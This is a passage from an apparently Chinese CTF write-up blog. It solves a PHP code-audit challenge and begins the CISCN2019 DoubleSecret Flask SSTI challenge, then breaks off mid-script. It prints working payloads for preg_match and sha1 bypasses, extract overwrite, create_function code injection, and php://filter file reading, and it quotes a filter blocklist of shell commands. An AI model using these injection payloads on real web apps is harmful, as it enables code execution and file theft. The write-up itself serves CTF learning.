class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>目的</strong>：get传的file参数不能有http、https、debu参数必须以aqua_is_cute开头且结尾，而又不能等于aqua_is_cute</p><p><strong>绕过</strong>：debu&#x3D;aqua_is_cute%00（用%00截断，或在后面加%0a等等换行符或空格），只会匹配第一行加%0a换行符即可</p><h2 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p><strong>目的</strong>：参数的值不能包含字母</p><p><strong>特性</strong>：**&#96;它接收$_GET和$_POST的数据，如果get和post一样的参数名，它会优先选择post形式传入的参数的值**</p><p><strong>绕过</strong>：get正常传值，在post传值时有同名参数传数字就行</p><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(file_get_contents($file)</span> !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    die<span class="hljs-comment">(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;)</span>;<br></code></pre></td></tr></table></figure><p>使用data:&#x2F;&#x2F;伪协议绕过即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">get：<br><span class="hljs-attribute">file</span>=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&amp;debu=aqua_is_cute%0a<br><br>post：<br><span class="hljs-attribute">file</span>=1&amp;debu=1<br></code></pre></td></tr></table></figure><p>记得编码。为了绕过第一关</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">get</span>:<br><span class="hljs-attribute">file</span>=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>C%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E%<span class="hljs-number">3</span>B%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">5</span>A%<span class="hljs-number">47</span>%<span class="hljs-number">56</span>%<span class="hljs-number">69</span>%<span class="hljs-number">64</span>%<span class="hljs-number">56</span>%<span class="hljs-number">39</span>%<span class="hljs-number">6</span>B%<span class="hljs-number">5</span>A%<span class="hljs-number">57</span>%<span class="hljs-number">4</span>A%<span class="hljs-number">31</span>%<span class="hljs-number">58</span>%<span class="hljs-number">32</span>%<span class="hljs-number">46</span>%<span class="hljs-number">78</span>%<span class="hljs-number">64</span>%<span class="hljs-number">57</span>%<span class="hljs-number">45</span>%<span class="hljs-number">3</span>D&amp;%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>_is_%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>a<br><br><span class="hljs-attribute">post</span>：<br><span class="hljs-attribute">file</span>=<span class="hljs-number">1</span>&amp;debu=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>成功绕过</p><h2 id="sha1-extract"><a href="#sha1-extract" class="headerlink" title="sha1 &amp; extract"></a>sha1 &amp; extract</h2><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">if ( sha1(<span class="hljs-string">$s</span>hana) === sha1(<span class="hljs-string">$p</span>asswd) &amp;&amp; <span class="hljs-string">$s</span>hana != <span class="hljs-string">$p</span>asswd )&#123;<br>    extract(<span class="hljs-string">$_</span>GET[<span class="hljs-comment">&quot;flag&quot;</span>]);<br>    echo <span class="hljs-comment">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; else&#123;<br>    die(<span class="hljs-comment">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绕过</strong>：sha1传数组会被转化为Null</p><p><strong>extract($_GET[“flag”])的利用</strong>：extract可以进行变量覆盖，刚好看到下面的正则对code进行过滤，但实际code为空，所以我们肯定要借助extract对code进行赋值</p><p>使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即<code>flag[code]</code>和<code>flag[arg]</code>的形式</p><h2 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function()代码注入"></a>create_function()代码注入</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||<span class="hljs-string"> </span><br><span class="hljs-string">preg_match(&#x27;/fil</span>|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) &#123; </span><br><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="hljs-string">&#125; else &#123; </span><br><span class="hljs-string">    include &quot;flag.php&quot;;</span><br><span class="hljs-string">    $code(&#x27;&#x27;, $arg); </span><br><span class="hljs-string">&#125; ?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p><code>create_function()</code>函数有两个参数<code>$args</code>和<code>$code</code>，用于创建一个lambda样式的函数</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$myfunc</span> = create_function(<span class="hljs-string">&#x27;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>&#x27;</span>, <span class="hljs-string">&#x27;return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是如果第二个参数没有限制（<code>$code=return$a+$b;&#125;eval($_POST[&#39;cmd&#39;]);//</code>），就会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myfunc</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-comment">//&#125;</span><br></code></pre></td></tr></table></figure><p>通过手工闭合<code>&#125;</code>使后面的代码<code>eval()</code>逃逸出了<code>myFunc()</code>得以执行，然后利用注释符<code>//</code>注释掉<code>&#125;</code>保证了语法正确。</p><p><strong>绕过</strong>： 根据<code>$code(&#39;&#39;, $arg);</code> 的形式，我们需要将code构造为creat_function，arg将前面闭合然后进行代码执行</p><p>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">【GET】<span class="hljs-keyword">file</span>=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=<span class="hljs-variable">&amp;debu</span>=aqua_is_cute%0a<span class="hljs-variable">&amp;shana</span>[]=1<span class="hljs-variable">&amp;passwd</span>[]=2<span class="hljs-variable">&amp;flag</span>[code]=create_function<span class="hljs-variable">&amp;flag</span>[arg]=&#125;var_dump(get_defined_vars());//<br>#get_defined_vars — 返回所有已定义变量的数组<br>【POST】<span class="hljs-keyword">file</span>=1<span class="hljs-variable">&amp;debu</span>=2<br></code></pre></td></tr></table></figure><p>编码：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">【GET】<span class="hljs-keyword">file</span>=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&amp;%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&amp;%73%68%61%6E%61[]=<span class="hljs-number">1</span>&amp;%70%61%73%73%77%64[]=<span class="hljs-number">2</span>&amp;%66%6C%61%67[%63%6F%64%65]=create_function&amp;%66%6C%61%67[%61%72%67]=&#125;var_dump(get_defined_vars());<span class="hljs-comment">//</span><br><br>POST：<span class="hljs-keyword">file</span>=<span class="hljs-number">1</span>&amp;debu=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>输出的最后有一句话：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Baka, do you think <span class="hljs-keyword">it</span>&#x27;s so easy <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">my</span> flag? I hid <span class="hljs-keyword">the</span> <span class="hljs-built_in">real</span> flag <span class="hljs-keyword">in</span> rea1fl4g.php <span class="hljs-number">23333</span><span class="hljs-string">&quot; &#125;</span><br></code></pre></td></tr></table></figure><h2 id="读取flag"><a href="#读取flag" class="headerlink" title="读取flag"></a>读取flag</h2><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p> 提示了flag在rea1fl4g.php里，所以考虑用require函数(或fopen和fgets)，php&#x2F;&#x2F;filter读取文件</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">require</span>(php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=rea1fl4g.php)<br></code></pre></td></tr></table></figure><p>考虑用filter流读取flag文件，又因为“inc”、单引号、双引号都被过滤了，所以考虑用require代替include，按位取反绕过单双引号的限制。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure><p>总payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">【GET】?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>F<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%3</span>B<span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%5</span>A<span class="hljs-variable">%47</span><span class="hljs-variable">%56</span><span class="hljs-variable">%69</span><span class="hljs-variable">%64</span><span class="hljs-variable">%56</span><span class="hljs-variable">%39</span><span class="hljs-variable">%6</span>B<span class="hljs-variable">%5</span>A<span class="hljs-variable">%57</span><span class="hljs-variable">%4</span>A<span class="hljs-variable">%31</span><span class="hljs-variable">%58</span><span class="hljs-variable">%32</span><span class="hljs-variable">%46</span><span class="hljs-variable">%78</span><span class="hljs-variable">%64</span><span class="hljs-variable">%57</span><span class="hljs-variable">%45</span><span class="hljs-variable">%3</span>D&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>_is_<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>a&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>E<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>F<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span>]<span class="hljs-operator">=</span>create_function&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>C<span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span>]<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span><br>POST：file<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;debu<span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>解码拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> php特性 </tag>
            
            <tag> sha1绕过 </tag>
            
            <tag> extract </tag>
            
            <tag> $_SERVER[&#39;QUERY_STRING&#39;] </tag>
            
            <tag> preg_match </tag>
            
            <tag> create_function() </tag>
            
            <tag> 取反绕过单双引号过滤 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019华东南赛区-DoubleSecret1</title>
      <link href="/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/"/>
      <url>/2025/04/15/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019华东南赛区-DoubleSecret1"><a href="#CISCN2019华东南赛区-DoubleSecret1" class="headerlink" title="CISCN2019华东南赛区-DoubleSecret1"></a>CISCN2019华东南赛区-DoubleSecret1</h1><p>打开后看到这样一句话</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Welcome <span class="hljs-keyword">To</span> <span class="hljs-built_in">Find</span> Secret<br></code></pre></td></tr></table></figure><p>尝试搜索页面，&#x2F;secret</p><p>然后又是提示信息</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">Tell me your secret.I will encrypt it so <span class="hljs-keyword">others</span> can<span class="hljs-symbol">&#x27;t</span> see<br></code></pre></td></tr></table></figure><p>让我们传入数值，然后他会给我们加密，我们随便输点东西。报错了</p><p><img src="/../image/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-DoubleSecret1-1.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 假设这是在 Flask 应用中的一个视图函数，名为 secret</span><br><span class="hljs-comment"># 该函数可能用于处理用户输入的秘密信息，并进行解密和渲染</span><br>def secret():<br>    <span class="hljs-comment"># 假设 secret 是一个变量，可能是从请求中获取的加密后的秘密信息</span><br>    <span class="hljs-comment"># 检查 secret 变量是否为 None，如果为 None，说明没有提供秘密信息</span><br>    <span class="hljs-keyword">if</span>(secret==None):<br>        <span class="hljs-comment"># 如果 secret 为 None，返回提示信息，要求用户提供秘密信息</span><br>        <span class="hljs-literal">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br>    <br>    <span class="hljs-comment"># 实例化一个 RC4 加密解密类的对象，使用 &quot;HereIsTreasure&quot; 作为密钥</span><br>    <span class="hljs-comment"># 这里假设 rc4_Modified 是一个自定义的模块，其中包含 RC4 类</span><br>    <span class="hljs-comment"># RC4 是一种流加密算法，常用于数据的加密和解密</span><br>    rc = rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment"># 解密</span><br>    <br>    <span class="hljs-comment"># 调用 RC4 对象的 do_crypt 方法对 secret 进行解密操作</span><br>    <span class="hljs-comment"># 解密后的结果存储在 deS 变量中</span><br>    deS = rc.do_crypt(secret)<br>    <br>    <span class="hljs-comment"># 使用 Flask 的 render_template_string 函数将解密后的字符串渲染为模板</span><br>    <span class="hljs-comment"># safe 函数可能是 Flask 中的 MarkupSafe 模块的 safe 函数，用于将字符串标记为安全的，防止 XSS 攻击</span><br>    <span class="hljs-comment"># 渲染后的结果存储在变量 a 中</span><br>    <span class="hljs-keyword">a</span> = render_template_string(safe(deS))<br>    <br>    <span class="hljs-comment"># 将渲染后的结果 a 转换为小写形式，并检查其中是否包含 &#x27;ciscn&#x27; 字符串</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span>.<span class="hljs-built_in">lower</span>():<br>        <span class="hljs-comment"># 如果包含 &#x27;ciscn&#x27; 字符串，返回提示信息，表明检测到了敏感信息</span><br>        <span class="hljs-literal">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br>    <br>    <span class="hljs-comment"># 如果不包含 &#x27;ciscn&#x27; 字符串，返回渲染后的结果</span><br>    <span class="hljs-literal">return</span> <span class="hljs-keyword">a</span><br></code></pre></td></tr></table></figure><p>这里对我们输入参数进行判断是否为空，如果为空，则返回一段话，就是刚刚那句，如果传入了参数，就会进行加密，可以看到是RC4加密，而且还泄露了密钥，密钥就是”HereIsTreasure”，而且通过报错，我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。RC4加密脚本</p><p>使用 <code>rc4_Modified.RC4</code> 类，以 <code>&quot;HereIsTreasure&quot;</code> 作为<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5%E5%AF%B9&spm=1001.2101.3001.7020">密钥对</a> <code>secret</code> 进行解密，可以利用flask的模板注入，需加密</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 